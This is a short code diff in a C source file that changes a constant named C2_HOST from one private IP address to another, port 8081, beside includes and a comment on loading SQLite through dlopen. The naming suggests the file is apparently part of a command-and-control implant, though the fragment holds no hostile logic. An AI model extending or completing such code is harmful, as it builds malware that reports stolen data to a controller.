@@ -23,7 +23,7 @@
 #include <pthread.h>
 #include <sys/utsname.h>
 
-#define C2_HOST "192.168.2.67"
+#define C2_HOST "192.168.110.111"
 #define C2_PORT 8081
 
 /* === SQLite via dlopen (no link dependency) === */
